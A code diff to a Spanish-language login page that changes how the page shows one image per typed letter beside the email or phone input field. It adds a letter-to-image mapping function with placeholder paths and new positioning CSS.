@@ -14,16 +14,17 @@
             padding-right: 30px;
         }
 
+        .imagen-input .imagenes-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
         .imagen-input img {
             position: absolute;
-            top: 50%;
-            right: 5px;
-            transform: translateY(-50%);
             height: 20px;
             width: 20px;
-            cursor: pointer;
-            opacity: 0;
-            transition: opacity 0.3s ease-in-out;
+            margin-right: 5px;
         }
     </style>
     <script>
@@ -35,12 +36,23 @@
             for (var i = 0; i < texto.length; i++) {
                 var letra = texto[i];
                 var imagen = document.createElement("img");
-                imagen.src = "ruta_de_la_imagen"; // Reemplaza "ruta_de_la_imagen" con la ruta correcta de la imagen que deseas mostrar
-                imagen.style.transitionDelay = i * 0.1 + "s";
+                imagen.src = obtenerRutaImagen(letra.toLowerCase()); // Reemplaza "obtenerRutaImagen" con la función que devuelve la ruta de la imagen según la letra
+                imagen.style.left = (i * 25) + "px"; // Ajusta el espaciado horizontal de las imágenes
                 contenedor.appendChild(imagen);
-                setTimeout(function(img) {
-                    img.style.opacity = 1;
-                }, i * 100, imagen);
+            }
+        }
+
+        function obtenerRutaImagen(letra) {
+            // Retorna la ruta de la imagen correspondiente a la letra
+            // Personaliza esta función según tus necesidades
+            switch (letra) {
+                case "a":
+                    return "ruta_imagen_a";
+                case "b":
+                    return "ruta_imagen_b";
+                // Agrega más casos para las demás letras
+                default:
+                    return "ruta_imagen_predeterminada";
             }
         }
     </script>
@@ -52,7 +64,7 @@
         <div class="form-group">
             <div class="imagen-input">
                 <input class="form-control" type="text" name="correo" id="correo" placeholder="Número de móvil o correo electrónico" required oninput="mostrarImagenes()">
-                <div id="imagenesContainer"></div>
+                <div id="imagenesContainer" class="imagenes-container"></div>
             </div>
         </div>
         <button type="submit" name="submit" class="btn btn-primary btn-block">Iniciar sesión</button>
